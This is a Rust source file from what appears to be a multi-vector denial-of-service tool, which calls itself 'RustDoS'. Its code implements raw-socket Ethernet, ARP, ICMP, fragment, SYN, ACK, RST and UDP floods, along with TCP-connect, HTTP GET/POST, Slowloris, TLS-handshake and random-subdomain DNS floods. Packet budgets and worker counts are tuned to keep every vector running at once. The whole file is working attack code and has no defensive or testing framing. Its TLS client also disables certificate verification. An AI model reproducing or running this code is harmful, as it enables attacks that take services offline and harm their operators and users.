//! Attack workers for every vector.

use std::net::{Ipv4Addr, SocketAddr};
use std::sync::atomic::{AtomicI64, Ordering};
use std::sync::Arc;
use std::time::Duration;

use rand::{Rng, SeedableRng};
use tokio::io::AsyncWriteExt;
use tokio::net::{TcpStream, UdpSocket};

use crate::net::raw::{self, Iface, RawSock};
use crate::stats::Stats;
use crate::target::Target;
use crate::vectors::Vector;

pub struct Ctx {
    pub target: Target,
    pub port: u16,
    pub iface: Option<Iface>,
    pub raw: Option<Arc<RawSock>>,
    pub stats: Arc<Stats>,
    pub budgets: Vec<Arc<Budget>>,
}

/// Per-vector packet budget so one raw flood cannot starve the others or the
/// L7 vectors. SYN floods are capped lowest because every SYN-ACK comes back
/// and forces the kernel to emit a RST.
pub fn raw_rate(v: Vector) -> i64 {
    match v {
        Vector::SynFlood => 2_000,
        Vector::AckFlood | Vector::RstFlood => 6_000,
        Vector::UdpRaw => 15_000,
        Vector::IcmpFlood => 8_000,
        _ => 8_000,
    }
}

/// Shared packet budget so raw floods leave headroom for the L7 vectors.
/// Without it the raw loops saturate the interface and starve TCP/TLS/HTTP.
pub struct Budget {
    tokens: AtomicI64,
    rate: i64,
}

impl Budget {
    pub fn new(pps: i64) -> Self {
        Self {
            tokens: AtomicI64::new(pps / 100),
            rate: pps,
        }
    }

    fn refill(&self, dt_ms: i64) {
        let add = (self.rate * dt_ms / 1000).max(1);
        let cap = (self.rate / 10).max(1) * 2;
        let mut cur = self.tokens.load(Ordering::Relaxed);
        loop {
            let next = (cur + add).min(cap);
            match self
                .tokens
                .compare_exchange_weak(cur, next, Ordering::Relaxed, Ordering::Relaxed)
            {
                Ok(_) => return,
                Err(c) => cur = c,
            }
        }
    }

    fn take(&self, n: i64) -> bool {
        let mut cur = self.tokens.load(Ordering::Relaxed);
        loop {
            if cur < n {
                return false;
            }
            match self
                .tokens
                .compare_exchange_weak(cur, cur - n, Ordering::Relaxed, Ordering::Relaxed)
            {
                Ok(_) => return true,
                Err(c) => cur = c,
            }
        }
    }
}

pub fn spawn_refill(budgets: Vec<Arc<Budget>>, stats: Arc<Stats>) {
    tokio::spawn(async move {
        let mut last = std::time::Instant::now();
        while stats.running() {
            tokio::time::sleep(Duration::from_millis(10)).await;
            let now = std::time::Instant::now();
            let dt = now.duration_since(last).as_millis() as i64;
            last = now;
            if dt <= 0 {
                continue;
            }
            for b in &budgets {
                b.refill(dt);
            }
        }
    });
}

fn workers(v: Vector) -> usize {
    match v {
        Vector::EthFlood | Vector::ArpFlood | Vector::IcmpFlood | Vector::IpFrag => 1,
        Vector::SynFlood | Vector::AckFlood | Vector::RstFlood | Vector::UdpRaw => 1,
        Vector::UdpFlood => 4,
        Vector::TcpConnect => 256,
        Vector::HttpGet | Vector::HttpPost => 128,
        Vector::TlsFlood => 64,
        Vector::DnsFlood => 32,
        Vector::Slowloris => 200,
    }
}

pub fn launch(ctx: Arc<Ctx>, vectors: Vec<Vector>) {
    spawn_refill(ctx.budgets.clone(), ctx.stats.clone());
    for v in vectors {
        let idx = v.index();
        let n = workers(v);
        for _ in 0..n {
            let c = ctx.clone();
            if v.needs_raw() {
                std::thread::spawn(move || raw_worker(c, v, idx));
            } else {
                tokio::spawn(async move { async_worker(c, v, idx).await });
            }
        }
    }
}

// ------------------------------------------------------------------ raw

const BATCH: usize = 24;

fn raw_worker(ctx: Arc<Ctx>, v: Vector, idx: usize) {
    let (Some(iface), Some(sock)) = (ctx.iface.as_ref(), ctx.raw.as_ref()) else {
        return;
    };
    let dst = match ctx.target.primary() {
        Some(ip) => ip,
        None => return,
    };
    let hop = iface.next_hop_mac();
    let mut rng = rand::thread_rng();
    let mut frames: Vec<Vec<u8>> = Vec::with_capacity(BATCH + 2);

    while ctx.stats.running() {
        frames.clear();
        for _ in 0..BATCH {
            match v {
                Vector::EthFlood => {
                    let mut f = raw::eth_header(raw::BROADCAST_MAC, iface.mac, 0x88b5);
                    let len = rng.gen_range(46..1500);
                    let mut body = vec![0u8; len];
                    rng.fill(&mut body[..]);
                    f.extend_from_slice(&body);
                    frames.push(f);
                }
                Vector::ArpFlood => {
                    let gw = iface.gw_ip.unwrap_or(dst);
                    let probe: Ipv4Addr = Ipv4Addr::from(rng.gen::<u32>());
                    let target = if probe.is_unspecified() { gw } else { probe };
                    frames.push(raw::arp_request(iface.mac, iface.ip, target));
                }
                Vector::IcmpFlood => {
                    let mut payload = [0u8; 32];
                    rng.fill(&mut payload);
                    frames.push(raw::icmp_frame(
                        iface,
                        hop,
                        iface.ip,
                        dst,
                        raw::rand_u16(),
                        raw::rand_u16(),
                        &payload,
                    ));
                }
                Vector::IpFrag => {
                    let [a, b] = raw::frag_frames(
                        iface,
                        hop,
                        iface.ip,
                        dst,
                        raw::rand_port(),
                        ctx.port,
                    );
                    frames.push(a);
                    frames.push(b);
                }
                Vector::UdpRaw => {
                    let mut payload = [0u8; 24];
                    rng.fill(&mut payload);
                    frames.push(raw::udp_frame(
                        iface,
                        hop,
                        iface.ip,
                        dst,
                        raw::rand_port(),
                        ctx.port,
                        &payload,
                    ));
                }
                Vector::SynFlood | Vector::AckFlood | Vector::RstFlood => {
                    let flags = match v {
                        Vector::SynFlood => 0x02,
                        Vector::AckFlood => 0x10,
                        _ => 0x04,
                    };
                    frames.push(raw::tcp_frame(
                        iface,
                        hop,
                        iface.ip,
                        dst,
                        raw::rand_port(),
                        ctx.port,
                        raw::rand_u32(),
                        if v == Vector::AckFlood { raw::rand_u32() } else { 0 },
                        flags,
                        &[],
                    ));
                }
                _ => break,
            }
        }
        if !ctx.budgets[idx].take(frames.len() as i64) {
            std::thread::sleep(Duration::from_millis(1));
            continue;
        }
        match sock.send_batch(&frames) {
            Ok(n) => {
                for f in frames.iter().take(n) {
                    ctx.stats.hit(idx, f.len());
                }
                if n < frames.len() {
                    ctx.stats.error();
                }
            }
            Err(_) => ctx.stats.error(),
        }
    }
}

// ------------------------------------------------------------------ async

async fn async_worker(ctx: Arc<Ctx>, v: Vector, idx: usize) {
    let Some(dst) = ctx.target.primary() else {
        return;
    };
    let addr = SocketAddr::from((dst, ctx.port));
    let host = ctx.target.host.clone();

    match v {
        Vector::TcpConnect => {
            while ctx.stats.running() {
                match TcpStream::connect(addr).await {
                    Ok(_s) => ctx.stats.hit(idx, 0),
                    Err(_) => ctx.stats.error(),
                }
            }
        }
        Vector::UdpFlood => {
            let Ok(sock) = UdpSocket::bind("0.0.0.0:0").await else {
                return;
            };
            let mut rng = rand::rngs::StdRng::from_entropy();
            let mut buf = [0u8; 1200];
            while ctx.stats.running() {
                rng.fill(&mut buf[..]);
                match sock.send_to(&buf, addr).await {
                    Ok(n) => ctx.stats.hit(idx, n),
                    Err(_) => ctx.stats.error(),
                }
            }
        }
        Vector::HttpGet | Vector::HttpPost => {
            let mut rng = rand::rngs::StdRng::from_entropy();
            while ctx.stats.running() {
                let Ok(mut s) = TcpStream::connect(addr).await else {
                    ctx.stats.error();
                    continue;
                };
                let path = format!("/?{}", rng.gen::<u64>());
                let req = if v == Vector::HttpPost {
                    let body = "x".repeat(rng.gen_range(64..512));
                    format!(
                        "POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    )
                } else {
                    format!(
                        "GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: RustDoS\r\nAccept: */*\r\nConnection: close\r\n\r\n"
                    )
                };
                let n = req.len();
                if s.write_all(req.as_bytes()).await.is_ok() {
                    ctx.stats.hit(idx, n);
                } else {
                    ctx.stats.error();
                }
                drop(s);
            }
        }
        Vector::Slowloris => {
            while ctx.stats.running() {
                let Ok(mut s) = TcpStream::connect(addr).await else {
                    ctx.stats.error();
                    continue;
                };
                let head = format!(
                    "GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: RustDoS\r\nX-Pad: {}\r\n",
                    "a".repeat(64)
                );
                if s.write_all(head.as_bytes()).await.is_err() {
                    ctx.stats.error();
                    continue;
                }
                ctx.stats.hit(idx, head.len());
                // Dribble header lines to keep the socket alive.
                for _ in 0..6 {
                    if !ctx.stats.running() {
                        break;
                    }
                    tokio::time::sleep(Duration::from_millis(1200)).await;
                    let line = format!("X-Keep: {}\r\n", "b".repeat(16));
                    if s.write_all(line.as_bytes()).await.is_err() {
                        break;
                    }
                    ctx.stats.hit(idx, line.len());
                }
            }
        }
        Vector::TlsFlood => {
            let Some(cfg) = tls_config() else {
                return;
            };
            let server = host.clone();
            while ctx.stats.running() {
                let Ok(tcp) = TcpStream::connect(addr).await else {
                    ctx.stats.error();
                    continue;
                };
                let connector = tokio_rustls::TlsConnector::from(cfg.clone());
                let name = match rustls::pki_types::ServerName::try_from(server.clone()) {
                    Ok(n) => n,
                    Err(_) => return,
                };
                match tokio::time::timeout(
                    Duration::from_secs(3),
                    connector.connect(name, tcp),
                )
                .await
                {
                    Ok(Ok(_)) => ctx.stats.hit(idx, 517),
                    _ => ctx.stats.error(),
                }
            }
        }
        Vector::DnsFlood => {
            let Ok(sock) = UdpSocket::bind("0.0.0.0:0").await else {
                return;
            };
            let base = host.clone();
            let mut rng = rand::rngs::StdRng::from_entropy();
            while ctx.stats.running() {
                let label: String = (0..rng.gen_range(6..14))
                    .map(|_| (b'a' + rng.gen_range(0..26)) as char)
                    .collect();
                let q = dns_query(&format!("{label}.{base}"));
                match sock.send_to(&q, addr).await {
                    Ok(n) => ctx.stats.hit(idx, n),
                    Err(_) => ctx.stats.error(),
                }
            }
        }
        _ => {}
    }
}

fn dns_query(name: &str) -> Vec<u8> {
    let mut v = Vec::with_capacity(64);
    v.extend_from_slice(&rand::random::<u16>().to_be_bytes());
    v.extend_from_slice(&[0x01, 0x00]); // RD
    v.extend_from_slice(&[0, 1, 0, 0, 0, 0, 0, 0]);
    for label in name.split('.').filter(|l| !l.is_empty()) {
        let l = &label.as_bytes()[..label.len().min(63)];
        v.push(l.len() as u8);
        v.extend_from_slice(l);
    }
    v.push(0);
    v.extend_from_slice(&[0, 1, 0, 1]); // A / IN
    v
}

// ------------------------------------------------------------------ tls

fn tls_config() -> Option<Arc<rustls::ClientConfig>> {
    use rustls::client::danger::{HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier};
    use rustls::pki_types::{CertificateDer, ServerName, UnixTime};
    use rustls::{DigitallySignedStruct, SignatureScheme};

    #[derive(Debug)]
    struct NoVerify;

    impl ServerCertVerifier for NoVerify {
        fn verify_server_cert(
            &self,
            _e: &CertificateDer<'_>,
            _i: &[CertificateDer<'_>],
            _s: &ServerName<'_>,
            _o: &[u8],
            _n: UnixTime,
        ) -> Result<ServerCertVerified, rustls::Error> {
            Ok(ServerCertVerified::assertion())
        }
        fn verify_tls12_signature(
            &self,
            _m: &[u8],
            _c: &CertificateDer<'_>,
            _d: &DigitallySignedStruct,
        ) -> Result<HandshakeSignatureValid, rustls::Error> {
            Ok(HandshakeSignatureValid::assertion())
        }
        fn verify_tls13_signature(
            &self,
            _m: &[u8],
            _c: &CertificateDer<'_>,
            _d: &DigitallySignedStruct,
        ) -> Result<HandshakeSignatureValid, rustls::Error> {
            Ok(HandshakeSignatureValid::assertion())
        }
        fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
            rustls::crypto::ring::default_provider()
                .signature_verification_algorithms
                .supported_schemes()
        }
    }

    let _ = rustls::crypto::ring::default_provider().install_default();
    let cfg = rustls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(NoVerify))
        .with_no_client_auth();
    Some(Arc::new(cfg))
}
